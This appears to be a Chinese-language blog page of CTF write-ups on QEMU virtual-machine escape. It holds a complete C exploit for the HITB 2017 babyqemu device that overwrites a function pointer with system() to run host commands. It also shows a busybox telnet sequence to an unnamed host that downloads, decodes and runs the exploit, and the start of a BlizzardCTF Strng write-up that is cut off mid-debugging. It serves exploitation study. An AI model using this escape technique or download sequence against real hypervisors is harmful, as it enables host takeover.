所以第一个分支cpu_physical_memory_rw最后一个参数是1，所以最终调用的是address_space_write，第二个分支当然就是address_space_read_full 看address_space_write代码，可以知道cpu_physical_memory_rw(opaque-&gt;dma.dst, v3, opaque-&gt;dma.cnt, 1);是将v3复制到opaque-&gt;dma.dst，即将dma_buf[opaque-&gt;dma.src- 0x40000]读取到opaque-&gt;dma.dst，而cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0);则将opaque-&gt;dma.src复制到v6，即将opaque-&gt;dma.src的内容复制到dma_buf[opaque-&gt;dma.dst- 0x40000] 值得注意的是，cpu_physical_memory_rw的第一个参数为硬件地址，即物理地址，所以我们需要将qemu里面的虚拟地址，转化为物理地址。 分析了这么多，漏洞点就在于对于dma_buf的索引没有任何限制，导致可以越界读写 漏洞利用cpu_physical_memory_rw函数的第一个参数，他是一个物理地址，整个过程就是一个中间人的一个功能。cmd= 1|2时，可以通过数组索引越界，将泄露的地址读入物理地址，致我们从这个地址读出，就完成了泄露当cmd=1 时，可以将物理地址上面的值写到任意地址（事前我们可以通过上面cmd= 1|2时，将我们要写入的值写到物理地址） 漏洞利用思路1、泄露函数指针enc，由于这个qemu-system-x86_64的导入表有system，所以我们直接可以算出system@plt2、用system覆盖enc指针3、写入opaque-&gt;dma_buf为要执行的命令，比如cat flag4、使用cmd=1|2|4时，调用enc函数，劫持控制流 在编写代码中有一个坑点，你mmio_write的值的大小是8个字节，就会写两次，导致覆盖了下一个值，所以一定要按照src，dst，cnt的顺序来设置 我们在题目的目录建立一个flag文件用于测试 123456giantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ lsbabyqemu.tar.gz exp launch.sh qemu-system-x86_64 start.txtbreakpoint.txt exp.c pc-bios rootfs vmlinuz-4.8.0-52-genericcpexptorootfs.sh flag peda-session-qemu-system-x86_64.txt rootfs.cpiogiantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ cat flagflag&#123;You escaped successfully!&#125; 下面是逃逸执行system(“cat flag”)的效果（-append ‘console=ttyS0 root=/dev/ram oops=panic panic=1’ 可以让我们在host执行system(cmd)，而输出显示在qemu的命令行中） 12345678910111213141516__ __ _ _ _ _ ___ _____ ____\\ \\ / /__| | ___ ___ _ __ ___ ___ | |_ ___ | | | |_ _|_ _| __ ) \\ \\ /\\ / / _ \\ |/ __/ _ \\| &apos;_ ` _ \\ / _ \\ | __/ _ \\ | |_| || | | | | _ \\ \\ V V / __/ | (_| (_) | | | | | | __/ | || (_) | | _ || | | | | |_) | \\_/\\_/ \\___|_|\\___\\___/|_| |_| |_|\\___| \\__\\___/ |_| |_|___| |_| |____/Welcome to HITBHITB login: root# ./expmmio_base Resource0Base: 0x7ff8115c9000gva_to_gpa tmpbuf_phys_addr 0x1dee890hitb_enc_addr: 0x55c0aa03bdd0binary_base_addr: 0x55c0a9db8000system_addr: 0x55c0a9fb5b18flag&#123;You escaped successfully!&#125;# 顺便尝试弹计算器 最终exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;ctype.h&gt;#include &lt;termios.h&gt;#include &lt;assert.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/io.h&gt;#define MAP_SIZE 4096UL#define MAP_MASK (MAP_SIZE - 1)#define DMA_BASE 0x40000#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)char* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;;unsigned char* tmpbuf;uint64_t tmpbuf_phys_addr;unsigned char* mmio_base;unsigned char* getMMIOBase()&#123; int fd; if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123; perror(&quot;open pci device&quot;); exit(-1); &#125; mmio_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if(mmio_base == (void *) -1) &#123; perror(&quot;mmap&quot;); exit(-1); &#125; return mmio_base;&#125;// 获取页内偏移uint32_t page_offset(uint32_t addr)&#123; // addr &amp; 0xfff return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);&#125;uint64_t gva_to_gfn(void *addr)&#123; uint64_t pme, gfn; size_t offset; int fd; fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); if (fd &lt; 0) &#123; perror(&quot;open&quot;); exit(1); &#125; // printf(&quot;pfn_item_offset : %p\\n&quot;, (uintptr_t)addr &gt;&gt; 9); offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7; ////下面是网上其他人的代码，只是为了理解上面的代码 //一开始除以 0x1000 （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了， //pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址 //最终 vir/2^12 * 8 = (vir / 2^9) &amp; ~7 //这跟上面的右移9正好对应，但是为什么要 &amp; ~7 ,因为你 vir &gt;&gt; 12 &lt;&lt; 3 , 跟vir &gt;&gt; 9 是有区别的，vir &gt;&gt; 12 &lt;&lt; 3低3位肯定是0，所以通过&amp; ~7将低3位置0 // int page_size=getpagesize(); // unsigned long vir_page_idx = vir/page_size; // unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t); lseek(fd, offset, SEEK_SET); read(fd, &amp;pme, 8); // 确保页面存在——page is present. if (!(pme &amp; PFN_PRESENT)) return -1; // physical frame number gfn = pme &amp; PFN_PFN; return gfn;&#125;uint64_t gva_to_gpa(void *addr)&#123; uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);&#125;void mmio_write(uint64_t addr, uint64_t value)&#123; *((uint64_t*)(mmio_base + addr)) = value;&#125;uint64_t mmio_read(uint64_t addr)&#123; return *((uint64_t*)(mmio_base + addr));&#125;void set_cnt(uint64_t val)&#123; mmio_write(144, val);&#125;void set_src(uint64_t val)&#123; mmio_write(128, val);&#125;void set_dst(uint64_t val)&#123; mmio_write(136, val);&#125;void start_dma_timer(uint64_t val)&#123; mmio_write(152, val);&#125;void dma_read(uint64_t offset, uint64_t cnt)&#123; // 设置dma_buf的索引 set_src(DMA_BASE + offset); // 设置读取后要写入的物理地址 set_dst(tmpbuf_phys_addr); // 设置读取的大小 set_cnt(cnt); // 触发hitb_dma_timer start_dma_timer(1|2); // 等待上面的执行完 sleep(1);&#125;void dma_write(uint64_t offset, char* buf, uint64_t cnt)&#123; // 将我们要写的内容先复制到tmpbuf memcpy(tmpbuf, buf, cnt); //设置物理地址（要从这读取写到dma_buf[opaque-&gt;dma.dst-0x40000]） set_src(tmpbuf_phys_addr); // 设置dma_buf的索引 set_dst(DMA_BASE + offset); // 设置写入大小 set_cnt(cnt); // 触发hitb_dma_timer start_dma_timer(1); // 等待上面的执行完 sleep(1);&#125;void dma_write_qword(uint64_t offset, uint64_t val)&#123; dma_write(offset, (char *)&amp;val, 8);&#125;void dma_enc_read(uint64_t offset, uint64_t cnt)&#123; // 设置dma_buf的索引 set_src(DMA_BASE + offset); // 设置读取后要写入的物理地址 set_dst(tmpbuf_phys_addr); // 设置读取的大小 set_cnt(cnt); // 触发hitb_dma_timer start_dma_timer(1|2|4); // 等待上面的执行完 sleep(1);&#125;int main(int argc, char const *argv[])&#123; getMMIOBase(); printf(&quot;mmio_base Resource0Base: %p\\n&quot;, mmio_base); tmpbuf = malloc(0x1000); tmpbuf_phys_addr = gva_to_gpa(tmpbuf); printf(&quot;gva_to_gpa tmpbuf_phys_addr %p\\n&quot;, (void*)tmpbuf_phys_addr); //just test // dma_write(0, &quot;giantbranch&quot;, 11); // dma_read(0, 11); // printf(&quot;tmpbuf: %s\\n&quot;, tmpbuf); // 将enc函数指针写到tmpbuf_phys_addr,之后通过tmpbuf读出即可 dma_read(4096, 8); uint64_t hitb_enc_addr = *((uint64_t*)tmpbuf); uint64_t binary_base_addr = hitb_enc_addr - 0x283DD0; uint64_t system_addr = binary_base_addr + 0x1FDB18; printf(&quot;hitb_enc_addr: 0x%lx\\n&quot;, hitb_enc_addr); printf(&quot;binary_base_addr: 0x%lx\\n&quot;, binary_base_addr); printf(&quot;system_addr: 0x%lx\\n&quot;, system_addr); // 覆盖enc函数指针为system地址 dma_write_qword(4096, system_addr); // 将我们要执行的命令复制到tmpbuf中 // char* command = &quot;gnome-calculator&quot;; // char* command = &quot;pwd&quot;; char* command = &quot;cat flag&quot;; dma_write(0x200, command, strlen(command)); // 触发hitb_dma_timer中的enc函数,从而调用syetem // 下面的666设置的是cnt，可以是任意值，没什么影响 dma_enc_read(0x200, 666); return 0;&#125; 关于调试由于有符号，直接下断点即可，由于启动期间我这中断多多次，所以搞了很多个c 123456789101112131415161718192021giantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ cat start.txtrun -initrd ./rootfs.cpio -kernel ./vmlinuz-4.8.0-52-generic -append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos; -enable-kvm -monitor /dev/null -m 64M --nographic -L ./dependency/usr/local/share/qemu -L pc-bios -device hitb,id=vdab hitb_dma_timerb hitb_mmio_writeccccccgiantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ sudo gdb -q ./qemu-system-x86_64pwndbg: loaded 176 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from ./qemu-system-x86_64...done.gdb-peda$ source start.txt[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.[New Thread 0x7ffff0c35700 (LWP 28226)][New Thread 0x7ffff0434700 (LWP 28229)][New Thread 0x7fffed3ff700 (LWP 28231)] 关于exp传到qemu中由于这个ssh和scp都不奏效，而且网络也不通，所以就只能解开它的文件系统，把exp放进去root家目录，之后再压缩 解压命令是cpio -idmv &lt; rootfs.cpio,注意将rootfs.cpio放入一个新建的文件夹内再解开，有时候rootfs.cpio被gz二次压缩了可以用gunzip ./rootfs.cpio.gz解开，再执行上面的命令即可。 那么每次修改为exp，执行下面的脚本即可 1234giantbranch@ubuntu:~/qemu_escape/HITB-GSEC-2017-babyqemu$ cat ./cpexptorootfs.shgcc -o exp -static exp.ccp ./exp ./rootfs/rootcd ./rootfs &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.cpio 当然在实际比赛中，网络肯定是通的，而且这里的镜像是一个类似于嵌入式的简单系统，没有nc，但是有busybox，busybox支持telnet命令，所以可以通过下面示例进行下载exp 1234# telnet XXX.XXX.XXX.XXX 6666 &gt; pwn.b64# base64 -d pwn.b64 &gt; pwn# chmod +x pwn# ./pwn 参考主要参考https://kitctf.de/writeups/hitb2017/babyqemu 其他参考https://github.com/coreos/qemu/blob/ed988a3274c8e08ce220419cb48ef81a16754ea4/include/qemu/timer.h#L414https://github.com/qemu/qemuhttps://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L96https://github.com/qemu/qemu/blob/f2cfa1229e539ee1bb1822912075cf25538ad6b9/include/qemu/timer.h#L666https://zh.wikipedia.org/wiki/%E7%9B%B4%E6%8E%A5%E8%A8%98%E6%86%B6%E9%AB%94%E5%AD%98%E5%8F%96https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"},{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"},{"name":"vm escape","slug":"vm-escape","permalink":"https://www.giantbranch.cn/tags/vm-escape/"},{"name":"虚拟机逃逸","slug":"虚拟机逃逸","permalink":"https://www.giantbranch.cn/tags/虚拟机逃逸/"}]},{"title":"CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng","slug":"CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng","date":"2019-12-03T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/","link":"","permalink":"https://www.giantbranch.cn/2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/","excerpt":"","text":"前面的部分更多的是翻译和学习 熟悉题目我们在qemu题目中中经常看到一些简写 内存映射I/O （Memory-mapped I/O —— MMIO）端口映射I/O （port-mapped I/O —— PMIO） qemu的漏洞一般在设备中，这个题目是一个PCI设备模拟器的漏洞 首先看看是哪个设备，可以从qemu的-device参数中看到设备名是strng 12345678910./qemu-system-x86_64 \\ -m 1G \\ -device strng \\ -hda my-disk.img \\ -hdb my-seed.img \\ -nographic \\ -L pc-bios/ \\ -enable-kvm \\ -device e1000,netdev=net0 \\ -netdev user,id=net0,hostfwd=tcp::5555-:22 由于qemu-system-x86_64程序是有符号的，所以在ida可以搜到相关函数 在strng_class_init这函数里面可以看到设备id是0x11E9 1234567891011void __fastcall strng_class_init(ObjectClass_0 *a1, void *data)&#123; ObjectClass_0 *v2; // rax v2 = object_class_dynamic_cast_assert(a1, &quot;pci-device&quot;, &quot;/home/rcvalle/qemu/hw/misc/strng.c&quot;, 154, &quot;strng_class_init&quot;); WORD1(v2[2].object_cast_cache[3]) = 0x11E9; BYTE4(v2[2].object_cast_cache[3]) = 0x10; v2[2].type = (Type)pci_strng_realize; HIWORD(v2[2].object_cast_cache[3]) = 0xFF; LOWORD(v2[2].object_cast_cache[3]) = 0x1234;&#125; 上面的数字可以跟下面的倒数第二个意义对应 12345678ubuntu@ubuntu:~$ lspci00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03) -v可以查看更加详细信息，看到内存是0xfebf1000的256字节大小的，PMIO端口是0xc050开始的8个端口号 1234567891011ubuntu@ubuntu:~$ lspci -v......00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10) Subsystem: Red Hat, Inc Device 1100 Physical Slot: 3 Flags: fast devsel Memory at febf1000 (32-bit, non-prefetchable) [size=256] I/O ports at c050 [size=8] ...... 我们在目录中也可以看到这个设备的文件 1234567891011121314151617181920212223242526272829ubuntu@ubuntu:~$ ll /sys/devices/pci0000\\:00/0000:00:03.0/total 0drwxr-xr-x 3 root root 0 Nov 18 03:30 ./drwxr-xr-x 11 root root 0 Nov 18 03:30 ../-rw-r--r-- 1 root root 4096 Nov 18 03:52 broken_parity_status-r--r--r-- 1 root root 4096 Nov 18 03:38 class-rw-r--r-- 1 root root 256 Nov 18 03:38 config-r--r--r-- 1 root root 4096 Nov 18 03:52 consistent_dma_mask_bits-rw-r--r-- 1 root root 4096 Nov 18 03:52 d3cold_allowed-r--r--r-- 1 root root 4096 Nov 18 03:38 device-r--r--r-- 1 root root 4096 Nov 18 03:52 dma_mask_bits-rw-r--r-- 1 root root 4096 Nov 18 03:52 enablelrwxrwxrwx 1 root root 0 Nov 18 03:52 firmware_node -&gt; ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06/-r--r--r-- 1 root root 4096 Nov 18 03:31 irq-r--r--r-- 1 root root 4096 Nov 18 03:52 local_cpulist-r--r--r-- 1 root root 4096 Nov 18 03:52 local_cpus-r--r--r-- 1 root root 4096 Nov 18 03:52 modalias-rw-r--r-- 1 root root 4096 Nov 18 03:52 msi_busdrwxr-xr-x 2 root root 0 Nov 18 03:52 power/--w--w---- 1 root root 4096 Nov 18 03:52 remove--w--w---- 1 root root 4096 Nov 18 03:52 rescan-r--r--r-- 1 root root 4096 Nov 18 03:38 resource-rw------- 1 root root 256 Nov 18 03:52 resource0-rw------- 1 root root 8 Nov 18 03:52 resource1lrwxrwxrwx 1 root root 0 Nov 18 03:52 subsystem -&gt; ../../../bus/pci/-r--r--r-- 1 root root 4096 Nov 18 03:52 subsystem_device-r--r--r-- 1 root root 4096 Nov 18 03:52 subsystem_vendor-rw-r--r-- 1 root root 4096 Nov 18 03:30 uevent-r--r--r-- 1 root root 4096 Nov 18 03:38 vendor 查看设备id是device目录 12ubuntu@ubuntu:~$ cat /sys/devices/pci0000\\:00/0000\\:00\\:03.0/device0x11e9 查看映射可以看resource（三列分别是开始地址 结束地址 标志），第一行是MMIO，第二行是PMIO 1234567891011121314ubuntu@ubuntu:~$ cat /sys/devices/pci0000\\:00/0000:00:03.0/resource0x00000000febf1000 0x00000000febf10ff 0x00000000000402000x000000000000c050 0x000000000000c057 0x00000000000401010x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000 查看IO端口命令是，我这有点问题，看到的都是0000 1ubuntu@ubuntu:~$ cat /proc/ioports 接下来我们回到ida，查看pci_strng_realize函数，这里注册了一些MMIO和PMIO的操作，去读写映射的内存 1234567891011121314151617181920212223void __fastcall pci_strng_realize(PCIDevice_0 *pdev, Error_0 **errp)&#123; unsigned __int64 v2; // ST08_8 v2 = __readfsqword(0x28u); memory_region_init_io( (MemoryRegion_0 *)&amp;pdev[1], &amp;pdev-&gt;qdev.parent_obj, &amp;strng_mmio_ops, pdev, &quot;strng-mmio&quot;, 0x100uLL); pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&amp;pdev[1]); memory_region_init_io( (MemoryRegion_0 *)&amp;pdev[1].io_regions[0].size, &amp;pdev-&gt;qdev.parent_obj, &amp;strng_pmio_ops, pdev, &quot;strng-pmio&quot;, 8uLL); if ( __readfsqword(0x28u) == v2 ) pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&amp;pdev[1].io_regions[0].size);&#125; 以第一个strng_mmio_ops，哪里有对于读写对应的函数指针 12345678910111213141516171819.data.rel.ro:0000000000A4A2A0 strng_mmio_ops dq offset strng_mmio_read; read.data.rel.ro:0000000000A4A2A0 ; DATA XREF: pci_strng_realize+F↑o.data.rel.ro:0000000000A4A2A0 dq offset strng_mmio_write; write.data.rel.ro:0000000000A4A2A0 dq 0 ; read_with_attrs.data.rel.ro:0000000000A4A2A0 dq 0 ; write_with_attrs.data.rel.ro:0000000000A4A2A0 dd DEVICE_NATIVE_ENDIAN ; endianness.data.rel.ro:0000000000A4A2A0 db 4 dup(0).data.rel.ro:0000000000A4A2A0 dd 0 ; valid.min_access_size.data.rel.ro:0000000000A4A2A0 dd 0 ; valid.max_access_size.data.rel.ro:0000000000A4A2A0 db 0 ; valid.unaligned.data.rel.ro:0000000000A4A2A0 db 7 dup(0).data.rel.ro:0000000000A4A2A0 dq 0 ; valid.accepts.data.rel.ro:0000000000A4A2A0 dd 0 ; impl.min_access_size.data.rel.ro:0000000000A4A2A0 dd 0 ; impl.max_access_size.data.rel.ro:0000000000A4A2A0 db 0 ; impl.unaligned.data.rel.ro:0000000000A4A2A0 db 3 dup(0).data.rel.ro:0000000000A4A2A0 db 4 dup(0).data.rel.ro:0000000000A4A2A0 dq 3 dup(0) ; old_mmio.read.data.rel.ro:0000000000A4A2A0 dq 3 dup(0) ; old_mmio.write 调试这个我直接copy参考文章作者的了，为了方便调试，关闭了aslr，那么PIE也是不起作用了 还有不推荐使用kvm模式，据说会让你的vm变得很快，具体我之后可能会都试试有什么差别，将原因写在这，也许不会写。 123456789101112$ cat comline.txtaslr off# strng_mmio_readb *0x555555964390# strng_mmio_writeb *0x5555559643E0 # strng_pmio_readb *0x5555559644B0# strng_pmio_writeb *0x555555964520 run -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -device e1000,netdev=net0 -netdevuser,id=net0,hostfwd=tcp::5555-:22 -q模式可以让gdb不输出版本信息，更加清爽 1234567891011121314151617181920$ gdb -q ./qemu-system-x86_64pwndbg: loaded 176 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from ./qemu-system-x86_64...done.gdb-peda$ source comline.txtBreakpoint 1 at 0x555555964390Breakpoint 2 at 0x5555559643e0Breakpoint 3 at 0x5555559644b0Breakpoint 4 at 0x555555964520[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.[New Thread 0x7ffff627b700 (LWP 26045)][New Thread 0x7fffe0dac700 (LWP 26046)][New Thread 0x7fffdec0b700 (LWP 26047)]main-loop: WARNING: I/O thread spun for 1000 iterations[ 0.000000] Initializing cgroup subsys cpuset[ 0.000000] Initializing cgroup subsys cpu[ 0.000000] Initializing cgroup subsys cpuacct............ MMIO相关函数我们设置一下opaque的结构体为STRNGState就可以了，不然看到的就只是opaque指针加上偏移了（当然这个题目将源码开源才能知道这个opaque时STRNGState，不然就只能将就这看了） 123456789uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)&#123; uint64_t result; // rax result = -1LL; if ( size == 4 &amp;&amp; !(addr &amp; 3) ) result = opaque-&gt;regs[addr &gt;&gt; 2]; return result;&#125; strng_mmio_read接收地址还有大小，而且需要size为4，而且地址最低两个bit都是0 123456789101112131415161718192021222324252627282930313233void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123; hwaddr v4; // rsi int v5; // ST08_4 uint32_t v6; // eax unsigned __int64 v7; // [rsp+18h] [rbp-20h] v7 = __readfsqword(0x28u); if ( size == 4 &amp;&amp; !(addr &amp; 3) ) &#123; v4 = addr &gt;&gt; 2; if ( (_DWORD)v4 == 1 ) &#123; opaque-&gt;regs[1] = ((__int64 (__fastcall *)(STRNGState *, hwaddr, uint64_t))opaque-&gt;rand)(opaque, v4, val); &#125; else if ( (unsigned int)v4 &lt; 1 ) &#123; if ( __readfsqword(0x28u) == v7 ) ((void (__fastcall *)(_QWORD))opaque-&gt;srand)((unsigned int)val); &#125; else &#123; if ( (_DWORD)v4 == 3 ) &#123; v5 = val; v6 = ((__int64 (__fastcall *)(uint32_t *))opaque-&gt;rand_r)(&amp;opaque-&gt;regs[2]); LODWORD(val) = v5; opaque-&gt;regs[3] = v6; &#125; opaque-&gt;regs[(unsigned int)v4] = val; &#125; &#125;&#125; 上面ida反编译错误的，上面的是rand函数是没有参数的（当然接下来贴的函数也会有这样的问题）， 这个函数也是需要size为4，而且地址最低两个bit都是0。 上面对要写入的地址右移两个bit再进行判断，其实赋值的地址跟地址相关的是在最后一行，好像我们可以控制写入的地址，但是遗憾的是PCI设备内部会检查你写入的地址时不时在256字节范围 PMIO函数在前面查看pci设备的时候，我们已经知道I/O ports是映射在0xc050处的8个字节 下面函数可以看到我们的地址只能是0或者4，那么就是对0xc050或者0xc054进行读写操作 123456789101112131415161718192021222324uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)&#123; uint64_t result; // rax uint32_t v4; // edx result = -1LL; if ( size == 4 ) &#123; if ( addr ) &#123; if ( addr == 4 ) &#123; v4 = opaque-&gt;addr; if ( !(v4 &amp; 3) ) result = opaque-&gt;regs[v4 &gt;&gt; 2]; &#125; &#125; else &#123; result = opaque-&gt;addr; &#125; &#125; return result;&#125; 下面是write的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123; uint32_t v4; // eax __int64 v5; // rax unsigned __int64 v6; // [rsp+8h] [rbp-10h] v6 = __readfsqword(0x28u); if ( size == 4 ) &#123; if ( addr ) &#123; if ( addr == 4 ) &#123; v4 = opaque-&gt;addr; if ( !(v4 &amp; 3) ) &#123; v5 = v4 &gt;&gt; 2; if ( (_DWORD)v5 == 1 ) &#123; opaque-&gt;regs[1] = ((__int64 (__fastcall *)(STRNGState *, signed __int64, uint64_t))opaque-&gt;rand)( opaque, 4LL, val); &#125; else if ( (unsigned int)v5 &lt; 1 ) &#123; if ( __readfsqword(0x28u) == v6 ) ((void (__fastcall *)(_QWORD))opaque-&gt;srand)((unsigned int)val); &#125; else if ( (_DWORD)v5 == 3 ) &#123; opaque-&gt;regs[3] = ((__int64 (__fastcall *)(uint32_t *, signed __int64, uint64_t))opaque-&gt;rand_r)( &amp;opaque-&gt;regs[2], 4LL, val); &#125; else &#123; opaque-&gt;regs[v5] = val; &#125; &#125; &#125; &#125; else &#123; opaque-&gt;addr = val; &#125; &#125;&#125; 上面可以看到，我们通过strng_pmio_write的addr为0分支（即写port：0xc050）控制opaque-&gt;addr，之后可以通过strng_pmio_read的addr==4分支可以任意读，通过strng_pmio_write的addr==4分支又可以任意写。 所以就是写入0xc050就是写入到opaque-&gt;addr写入0xc054就是将我们的val写到opaque-&gt;regs[opaque-&gt;addr &gt;&gt; 2] 位置 uaf.io作者给出了一些访问port I/O的方法 1、通过dd命令访问resource1 1234dd if=/sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource1 bs=4 count=1 - read the index 0dd if=/sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource1 bs=4 count=1 skip=1 - use index 0 as offset address to read fromdd if=XXX of=/sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource1 bs=4 count=1 - write XXX to index 0dd if=XXX of=/sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource1 bs=4 count=1 skip=1 - use index 0 as offset to write to 2、通过dd命令访问/dev/port，不过由于/dev/port是字符设备，是一个字符一个字符访问的，所以不满足size==4的要求3、当然还是通过in/out系列函数访问比较好 下面是其中两个函数在io.h文件的代码 1234567891011121314static __inline unsigned intinl (unsigned short int __port)&#123; unsigned int _v; __asm__ __volatile__ (&quot;inl %w1,%0&quot;:&quot;=a&quot; (_v):&quot;Nd&quot; (__port)); return _v;&#125;static __inline voidoutl (unsigned int __value, unsigned short int __port)&#123; __asm__ __volatile__ (&quot;outl %0,%w1&quot;: :&quot;a&quot; (__value), &quot;Nd&quot; (__port));&#125; 但是我们需要权限才能访问端口，0x000-0x3ff可以用ioperm(from, num, turn_on) 比如ioperm(0x300,5,1); 给 0x300 到 0x304 端口的访问权限 但是更高的端口就要用iopl(3)来获得权限，这个可以获得范围所有端口权限。当然我们需要root用户来运行程序才行。 in,out系列函数如下，分别是写入/读取一个字节（b结尾），两个字节（w结尾），四个字节（l结尾） 12345678910#include &lt;sys/io.h &gt;iopl(3); inb(port); inw(port); inl(port);outb(val,port); outw(val,port); outl(val,port); 漏洞利用利用思路1、通过strng_pmio_write和strng_pmio_read去泄露libc，因为STRNGState里面有三个函数指针2、我们将我们要执行的命令通过strng_mmio_write写到对应的内存3、最后我们将rand_r函数指针覆盖为system去执行我们的命令 我们先调试看看内存，用dd命令向0xc050写入一个4吧 12ubuntu@ubuntu:~$ echo 4 &gt; testubuntu@ubuntu:~$ sudo dd if=test of=/sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource1 bs=4 count=1 那gdb这边就会断下来了 12Thread 4 &quot;qemu-system-x86&quot; hit Breakpoint 4, strng_pmio_write (opaque=0x555557e2b8c0, addr=0x0, val=0xa34, size=0x2) at /home/rcvalle/qemu/hw/misc/strng.c:9191 /home/rcvalle/qemu/hw/misc/strng.c: No such file or directory. 由于echo有换行所以数字4（0x34）后面会有0x0a，所以导致最终val时0xa34,而且size时2，所以我们还是写三个东西到test里面，加上换行就是4个了 12ubuntu@ubuntu:~$ echo 666 &gt; testubuntu@ubuntu:~$ sudo dd if=test of=/sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource1 bs=4 count=1 看一下数据结构，可以看到我们操作的东西都在addr及后面地址，所以0xfa0偏移相当于我们的起始偏移（偏移为0的位置） 123456789101112131400000000 STRNGState struc ; (sizeof=0xC10, align=0x10, copyof_3815)00000000 pdev PCIDevice_0 ?000008F0 mmio MemoryRegion_0 ?000009F0 pmio MemoryRegion_0 ?00000AF0 addr dd ?00000AF4 regs dd 64 dup(?)00000BF4 db ? ; undefined00000BF5 db ? ; undefined00000BF6 db ? ; undefined00000BF7 db ? ; undefined00000BF8 srand dq ? ; offset00000C00 rand dq ? ; offset00000C08 rand_r dq ? ; offset00000C10 STRNGState ends 而randr_r距离addr时0x118 12&gt;&gt;&gt; hex(0xc08-0xaf0)&apos;0x118&apos; 调试到 0x555555964598 &lt;strng_pmio_write+120&gt; mov dword 